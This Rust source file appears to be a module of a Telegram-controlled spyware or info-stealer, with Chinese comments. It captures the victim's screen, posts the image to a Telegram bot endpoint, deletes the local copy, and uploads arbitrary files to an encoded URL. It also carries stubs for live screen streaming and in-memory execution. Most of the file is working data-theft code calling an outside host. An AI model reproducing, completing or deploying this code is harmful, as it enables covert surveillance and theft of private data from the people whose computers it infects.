use crate::*;
use reqwest::multipart;
use screenshots::Screen;
use std::{fs::File, io::Write};
use crate::functions::info_collect_use::*;
use crate::functions::tg_until::*;

pub fn screen_watch() {
    println!("this is screen_watch");
    {}
    // 监控屏幕推流
}

pub async fn upload_file(path: &str) -> Result<(), reqwest::Error> {
    let file_path = path;

    // 打开文件并读取内容
    let mut file = File::open(file_path).expect("Failed to open file");
    let mut file_content = Vec::new();
    file.read_to_end(&mut file_content)
        .expect("Failed to read file");

    // 构建 multipart 表单
    let form = reqwest::multipart::Form::new()
        .text("chat_id", format!("{}", CHAT_ID.as_str())) // 发送的 chat_id
        .part(
            "document",
            reqwest::multipart::Part::bytes(file_content)
                .file_name(file_path.to_string()) // 设置文件名
                .mime_str("application/octet-stream")
                .unwrap(),
        );

    // 发送请求
    let send_response = reqwest::Client::new()
        .post(format!("{}", decoded_url(UPLOAD_FILE_URL.as_str()))) // 使用格式化字符串
        .multipart(form) // 设置 multipart 表单数据
        .send()
        .await;

    // 检查响应结果
    match send_response {
        Ok(response) => {
            if response.status().is_success() {
                println!("File uploaded successfully.");
            } else {
                eprintln!("Failed to upload file. Status: {}", response.status());
            }
        }
        Err(e) => {
            eprintln!("Error sending request: {}", e);
        }
    }

    Ok(())
}



pub async fn screen_shot() {
    // 获取所有显示器

    let displays = match Screen::all() {
        Ok(displays) => displays,
        Err(_) => return tg_tools::sendmessage("无法获取屏幕信息").await,
    };

    let display = &displays[0].display_info; // 使用第一个显示器

    // 创建屏幕对象
    let screen = Screen::new(display);
    let image = match screen.capture() {
        Ok(image) => image,
        Err(e) => {
            eprintln!("Error capturing screenshot: {}", e);
            tg_tools::sendmessage(format!("截图出错:{}", e).as_str()).await;
            return;
        }
    };

    // 获取图像缓冲区
    let buffer = image.buffer();

    // 写入 PNG 文件
    let mut file =
        File::create(format!("{}\\screenshot.png", OUTPUT_DIR.as_str())).expect("无法创建文件");
    file.write_all(buffer).expect("写入文件失败");

    println!("Screenshot saved to screenshot.png");

    let file_data =
        fs::read(format!("{}/screenshot.png", OUTPUT_DIR.as_str())).expect("无法读取文件");

    let file_part = multipart::Part::bytes(file_data)
        .file_name("screenshot.png")
        .mime_str("image/png")
        .expect("无法设置 MIME 类型");

    let form = multipart::Form::new()
        .text("chat_id", CHAT_ID.to_string())
        .text(
            "message_thread_id",
            MESSAGE_THREAD_ID.lock().unwrap().to_string(),
        )
        .part("photo", file_part);

    // 发送文件到 Telegram
    println!("Uploading screenshot to Telegram...");

    let respone = reqwest::Client::new()
        .post(decoded_url(SEND_PHOTO_URL.as_str()))
        .multipart(form)
        .send()
        .await;
    print!("Screenshot upload response: {:?}", respone);
    std::fs::remove_file(format!("{}/screenshot.png", OUTPUT_DIR.as_str())).expect("无法删除文件");
    println!("Screenshot file deleted.");
}

// fn run_in_memory() {
//     {}
// }

// #[test]
// fn test_run_in_memory() {
//     println!("run_in_memort_test");
//     run_in_memory();
// }
